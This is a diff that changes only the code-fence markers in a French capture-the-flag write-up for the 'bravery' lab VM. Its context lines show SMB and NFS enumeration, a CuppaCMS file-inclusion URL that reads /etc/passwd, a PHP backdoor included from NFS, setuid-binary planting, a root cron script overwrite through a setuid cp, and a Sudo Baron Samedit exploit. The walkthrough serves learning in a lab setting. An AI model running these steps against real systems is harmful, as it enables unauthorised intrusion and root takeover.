@@ -21,7 +21,7 @@ On dispose juste de cette description pour le CTF :
 
 D'accord. Je vous laisse apprécier le résultat du scan de port dans sa totalité :  
 
-```plain
+```
 $ sudo nmap -T5 -sC -sV -p- 192.168.101.129 
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.101.129
@@ -116,7 +116,7 @@ Host script results:
 
 Il faut bien commencer par quelque chose donc choisissons SMB :  
 
-```plain
+```
 $ smbclient -U "" -N -L //192.168.101.129
 
         Sharename       Type      Comment
@@ -129,7 +129,7 @@ SMB1 disabled -- no workgroup available
 
 Ce partage anonyme contient pas mal de dossiers :  
 
-```plain
+```
 $ smbclient -U "" -N //192.168.101.129/anonymous
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -149,13 +149,13 @@ Dans chaque dossier peu de trouver pas mal de fichiers inutiles, le CTF tente au
 
 Il ne va pas être déçu :  
 
-```plain
+```
 $ find . -type f -size 0 -exec rm {} \;
 ```
 
 Ce qui réduit considérablement :  
 
-```plain
+```
 .
 ├── genevieve's folder
 │   ├── CMS
@@ -188,7 +188,7 @@ Ce qui réduit considérablement :
 
 Voici le contenu de quelques fichiers, d'abord le *readme.txt* à la racine :  
 
-```plain
+```
 
 -- READ ME! --                                                                                                         
 
@@ -204,20 +204,20 @@ Genevieve the Brave
 
 Le fichier *important!* :  
 
-```plain
+```
 need to migrate CMS. obsolete. speak to qiu about temporarily using her IIS to test a sharepoint installation.
 ```
 
 Le fichier *spear* :  
 
-```plain
+```
 
 Amidst the flurry of content are certain files that may stand out. Smart bravery will allow you to read what you want; stupid bravery is called recklessness.
 ```
 
 Le fichier *present* :  
 
-```plain
+```
 Should I bring her to watch the "Phantom of the Opera"?
 
 Hmmmm... but she looks so stressed recently... :-(
@@ -225,13 +225,13 @@ Hmmmm... but she looks so stressed recently... :-(
 
 et finalement le *readme.txt* de *David* :  
 
-```plain
+```
 Please DO NOT spread the password around.
 ```
 
 J'ai aussi rassemblé le contenu des fichiers *gossip* :  
 
-```plain
+```
 Qiu gives me too much work. I'm really stressed.
 Que sera sera, whatever will be, will be.
 Misconfigurations are the nightmare of system administrators.
@@ -247,7 +247,7 @@ L'autre partage SMB (*secured*) nécessite des identifiants que l'on a pas.
 
 De son côté NFS partage bien des données :  
 
-```plain
+```
 $ showmount -e 192.168.101.129 
 Export list for 192.168.101.129:
 /var/nfsshare *
@@ -255,13 +255,13 @@ Export list for 192.168.101.129:
 
 On monte le dossier :  
 
-```plain
+```
 $ sudo mount -t nfs 192.168.101.129:/var/nfsshare jail/
 ```
 
 L'utilitaire *tree* sous Linux est toujours appréciable, mangez-en.  
 
-```plain
+```
 .
 ├── [  29]  discovery
 ├── [  51]  enumeration
@@ -283,7 +283,7 @@ Un *feroxbuster* ne remontera pas grand chose de bien utile (toujours du blablah
 
 J'ai alors créé une wordlist à partir des noms d'utilisateurs qui apparaissaient dans le dossier SMB :  
 
-```plain
+```
 genevieve
 patrick
 qiu
@@ -299,13 +299,13 @@ A l'intérieur on trouve un CuppaCMS connu pour être vulnérable [à une faille
 
 Ainsi si on demande l'URL :  
 
-```plain
+```
 http://192.168.101.129/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
 
 On obtient la liste des utilisateurs dont voici deux lignes :  
 
-```plain
+```
 david:x:1000:1000:david:/home/david:/bin/bash
 rick:x:1004:1004::/home/rick:/bin/bash
 ```
@@ -314,7 +314,7 @@ L'inclusion distante semble échouer. Restriction dans la config PHP ? Filtrage 
 
 Peut importe, on a un partage NFS sur lequel on peut écrire et on sait que ça correspond au dossier */var/nfsshare*, on a donc y déposer notre backdoor PHP puis l'inclure :  
 
-```plain
+```
 http://192.168.101.129/genevieve/cuppaCMS//alerts/alertConfigField.php?urlConfig=/var/nfsshare/test.php&cmd=id
 ```
 
@@ -347,7 +347,7 @@ Mais dans les bases MySQL je ne trouve rien d'intéressant.
 
 Voici les fichiers appartenant aux utilisateurs mentionnés plus tôt :  
 
-```plain
+```
 $ find / -user david -ls 2> /dev/null
 628169    0 -rw-rw----   1 david    mail            0 Jun 10  2018 /var/spool/mail/david
 51235890    4 -rw-r--r--   1 david    users          31 Dec 13 19:04 /var/nfsshare/test.php
@@ -387,7 +387,7 @@ sudo mv setuid_david /mnt/bravery/
 
 Côté VM tout a marché comme sur des roulettes :  
 
-```plain
+```
 bash-4.2$ ls -l /var/nfsshare/setuid_david
 -rwsr-sr-x. 1 david david 3536680 Dec 13 19:31 /var/nfsshare/setuid_david
 bash-4.2$ /var/nfsshare/setuid_david
@@ -397,7 +397,7 @@ uid=1000(david) gid=1000(david) groups=1000(david),48(apache) context=system_u:s
 
 On peut aussi jeter un œil au partage qui nous était restreint :  
 
-```plain
+```
 [david@bravery ~]$ ls -l /samba/secured/
 total 12
 -rw-r--r--. 1 root root 376 Jun 16  2018 david.txt
@@ -407,7 +407,7 @@ total 12
 
 Je vous met le contenu du *README.txt* mais je ne suis pas sûr qu'il soit d'un quelconque intérêt :  
 
-```plain
+```
 README FOR THE USE OF THE BRAVERY MACHINE:
 
 Your use of the BRAVERY machine is subject to the following conditions:
@@ -421,7 +421,7 @@ For more enquiries, please log into the CMS using the correct magic word: goodte
 
 Je rapatrie et exécute LinPEAS qui contient Linux Exploit Suggester 1 et 2 :  
 
-```plain
+```
 [+] [CVE-2016-5195] dirtycow
 
    Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
@@ -506,19 +506,19 @@ Copier c'est voler
 
 On remarque surtout que la commande *cp* est setuid root :  
 
-```plain
+```
 -rwsr-xr-x. 1 root root 155176 Apr 11  2018 /usr/bin/cp
 ```
 
 Si on tente de dossier par exemple */etc/shadow* dans un dossier, il perd ses attributs et est illisible :  
 
-```plain
+```
 ----------. 1 root  david 1516 Dec 13 18:13 shadow
 ```
 
 Si en revanche on écrase un fichier à nous alors les permissions sont bonnes :  
 
-```plain
+```
 -rw-rw-r--. 1 david david 1516 Dec 13 18:16 bidule
 ```
 
@@ -526,7 +526,7 @@ Les mots de passe du *shadow* semblent être trop compliqués, la wordlist rocky
 
 L'utilisateur *root* a une tâche planifiée :  
 
-```plain
+```
 [david@bravery tmp]$ cp /var/spool/cron/root bidule
 [david@bravery tmp]$ cat bidule 
 */5 * * * * /bin/sh /var/www/maintenance.sh
@@ -536,7 +536,7 @@ L'utilisateur *root* a une tâche planifiée :
 
 On va écraser le script existant avec des commandes à nous :  
 
-```plain
+```
 [david@bravery tmp]$ cp my_script.sh /var/www/maintenance.sh
 [david@bravery tmp]$ cat /var/www/maintenance.sh
 #!/bin/sh
@@ -548,7 +548,7 @@ Si on merdouille on pourrait débuger tout ça en copiant et lisant les mails de
 
 5 minutes plus tard ma commande est passée :  
 
-```plain
+```
 $ ssh root@192.168.101.129
 Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
 [root@bravery ~]# id
@@ -562,7 +562,7 @@ Qui peut le moins peut le plus
 
 Evidemment on aurait pu mettre directement un binaire setuid root sur le partage NFS et shunter David :  
 
-```plain
+```
 [david@bravery nfsshare]$ ./setuid_root 
 ABRT has detected 1 problem(s). For more info run: abrt-cli list --since 1530713425
 [root@bravery nfsshare]# head -1 /etc/shadow
@@ -574,7 +574,7 @@ Alternative happy ending
 
 La VM est vulnérable à la faille [Sudo Baron Samedit](https://github.com/worawit/CVE-2021-3156) mais l'exploit à utiliser est différent, celui-ci ajoute un utilisateur *gg* (avec le même mot de passe) :  
 
-```plain
+```
 [david@bravery CVE-2021-3156-main]$ python exploit_userspec.py
 --- snip tons of output ---
 offset to first userspec: 0x740
